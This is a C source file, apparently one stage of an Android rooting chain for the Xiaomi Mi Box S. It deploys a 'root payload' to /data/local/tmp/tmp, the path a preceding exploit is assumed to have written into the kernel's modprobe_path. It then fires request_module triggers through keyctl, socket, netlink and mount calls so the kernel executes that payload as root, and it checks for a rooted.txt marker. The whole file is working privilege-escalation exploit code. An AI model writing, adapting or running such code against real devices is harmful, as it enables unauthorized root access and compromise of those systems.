/*
 * trigger_modprobe.c - Robust multi-vector modprobe trigger (Mi Box S)
 *
 * [修复说明]
 * 1. 移除了对根目录 /tmp 符号链接的无效创建（Android 根目录只读）。
 * 2. 统一将 Payload 部署到 /data/local/tmp/tmp。
 *    ★ 必须确保前置 Exploit 将 modprobe_path 覆写为 "/data/local/tmp/tmp"。
 * 3. 增强了 Payload 部署后的可执行权限检查。
 *
 * Build (NDK 21.4, 32-bit armeabi-v7a, static):
 *   %CLANG% trigger_modprobe.c -o trigger_modprobe -static
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <netinet/in.h>

/* ---- 32-bit ARM syscall numbers ---- */
#ifndef __NR_request_key
#define __NR_request_key 310
#endif
#ifndef __NR_add_key
#define __NR_add_key    309
#endif
#ifndef __NR_keyctl
#define __NR_keyctl     311
#endif

/* keyctl commands / special keyring ids */
#ifndef KEYCTL_SEARCH
#define KEYCTL_SEARCH 10
#endif
#define KEY_SPEC_PROCESS_KEYRING ((int32_t)-2)

static int g_total = 0;

/* ---- payload deploy ---- */
static int copy_file(const char *src, const char *dst) {
    int in = open(src, O_RDONLY);
    if (in < 0) return -1;
    
    int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (out < 0) { 
        close(in); 
        return -1; 
    }
    
    char buf[4096];
    ssize_t n;
    while ((n = read(in, buf, sizeof(buf))) > 0) {
        ssize_t off = 0;
        while (off < n) {
            ssize_t w = write(out, buf + off, n - off);
            if (w <= 0) break;
            off += w;
        }
    }
    close(in);
    close(out);
    chmod(dst, 0755);
    return 0;
}

static void deploy_payload(void) {
    const char *src = "/data/local/tmp/x_payload";
    // ★ 核心修复：统一使用可写路径，确保与 modprobe_path 覆写目标一致
    const char *dst = "/data/local/tmp/tmp"; 

    printf("  [deploy] Copying %s -> %s\n", src, dst);
    if (copy_file(src, dst) == 0) {
        printf("  [deploy] -> %s OK\n", dst);
    } else {
        printf("  [deploy] -> %s FAILED (%s)\n", dst, strerror(errno));
        printf("  [!] CRITICAL: Payload deployment failed.\n");
        return;
    }

    // 验证文件是否成功部署且具备可执行权限
    struct stat st;
    if (stat(dst, &st) == 0) {
        if (st.st_mode & S_IXUSR) {
            printf("  [verify] %s exists and is executable (size: %d bytes)\n", dst, (int)st.st_size);
        } else {
            printf("  [verify] WARNING: %s exists but is NOT executable!\n", dst);
        }
    } else {
        printf("  [verify] FAILED: %s does not exist after copy!\n", dst);
    }
}

/* ---- trigger vectors ---- */

/* Most reliable unprivileged request_module source under SELinux. */
static int try_keyctl_triggers(void) {
    int count = 0;
    const char *bogus = "kort_zzz_12345";
    syscall(__NR_request_key, bogus, "desc", (void *)NULL,
            (int32_t)KEY_SPEC_PROCESS_KEYRING);
    count++;
    syscall(__NR_add_key, bogus, "desc", "p", 1,
            (int32_t)KEY_SPEC_PROCESS_KEYRING);
    count++;
    syscall(__NR_keyctl, KEYCTL_SEARCH, (int32_t)KEY_SPEC_PROCESS_KEYRING,
            bogus, "desc", (int32_t)KEY_SPEC_PROCESS_KEYRING);
    count++;
    return count;
}

static int try_socket_triggers(void) {
    int count = 0;
    int pfs[] = {
        3,4,5,6,9,10,11,12,13,15,16,18,20,22,23,24,25,26,27,28,29,
        30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45
    };
    for (int i = 0; i < (int)(sizeof(pfs)/sizeof(pfs[0])); i++) {
        int s;
        if ((s = socket(pfs[i], SOCK_DGRAM, 0)) >= 0) { close(s); count++; }
        if ((s = socket(pfs[i], SOCK_STREAM, 0)) >= 0) { close(s); count++; }
        if ((s = socket(pfs[i], SOCK_RAW, 0)) >= 0) { close(s); count++; }
    }
    return count;
}

static int try_netlink_triggers(void) {
    int count = 0;
    int protos[] = {1,2,3,4,5,6,7,9,10,11,12,13,15,16,17,18,19,20,21};
    for (int i = 0; i < (int)(sizeof(protos)/sizeof(protos[0])); i++) {
        int s = socket(AF_NETLINK, SOCK_RAW, protos[i]);
        if (s >= 0) { close(s); count++; }
    }
    return count;
}

/* mount() of an unknown fstype normally triggers request_module("fs-<type>") */
static int try_mount_triggers(void) {
    int count = 0;
    const char *fstypes[] = {
        "bogus_fs_kort_12345", "ext4", "f2fs", "vfat", "ntfs", "btrfs",
        "xfs", "cifs", "nfs", "iso9660", "udf", "squashfs", "cramfs"
    };
    mkdir("/data/local/tmp/mnt_test", 0755);
    for (int i = 0; i < (int)(sizeof(fstypes)/sizeof(fstypes[0])); i++) {
        mount("/dev/block/loop0", "/data/local/tmp/mnt_test", fstypes[i], 0, NULL);
        count++;
    }
    rmdir("/data/local/tmp/mnt_test");
    return count;
}

/* 优化后的状态报告：直接检查实际执行路径 */
static void report_status(void) {
    struct stat st;
    const char *exec_path = "/data/local/tmp/tmp";
    
    printf("\n[*] Execution Path Status:\n");
    if (stat(exec_path, &st) == 0) {
        printf("    %s EXISTS (mode: 0%o, size: %d bytes)\n", 
               exec_path, st.st_mode & 0777, (int)st.st_size);
    } else {
        printf("    %s DOES NOT EXIST -> Kernel cannot execute payload!\n", exec_path);
    }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Mi Box S modprobe trigger (Fixed)\n");
    printf("[*] Expected modprobe_path: \"/data/local/tmp/tmp\"\n\n");

    printf("[*] Deploying root payload...\n");
    deploy_payload();

    printf("\n[*] Firing request_module vectors...\n");

    printf("  [1] keyctl (request_key/add_key/keyctl_search bogus type)... ");
    int c = try_keyctl_triggers();
    printf("%d calls\n", c); g_total += c;

    printf("  [2] socket protocol families... ");
    c = try_socket_triggers();
    printf("%d calls\n", c); g_total += c;

    printf("  [3] netlink protocols... ");
    c = try_netlink_triggers();
    printf("%d calls\n", c); g_total += c;

    printf("  [4] mount bogus fstypes (best-effort, usually SELinux-blocked)... ");
    c = try_mount_triggers();
    printf("%d calls\n", c); g_total += c;

    printf("\n[*] Total trigger attempts: %d\n", g_total);

    /* give the async usermodehelper time to run */
    sleep(3);

    report_status();

    struct stat st;
    if (stat("/data/local/tmp/rooted.txt", &st) == 0) {
        printf("\n[+] rooted.txt EXISTS! (%d bytes)\n", (int)st.st_size);
        printf("--- contents ---\n");
        FILE *f = fopen("/data/local/tmp/rooted.txt", "r");
        if (f) {
            char buf[512];
            while (fgets(buf, sizeof(buf), f)) printf("%s", buf);
            fclose(f);
        }
        printf("--- end ---\n");
        printf("[+] CHAIN WORKS - you have root via modprobe_path\n");
    } else {
        printf("\n[-] rooted.txt not found yet.\n");
        printf("    Troubleshooting:\n");
        printf("    1. Ensure modprobe_path was overwritten to '/data/local/tmp/tmp'.\n");
        printf("    2. Check dmesg for SELinux denials (avc: denied) blocking execution.\n");
        printf("    3. Verify /data/local/tmp/x_payload is a valid static ARM32 binary.\n");
    }
    return 0;
}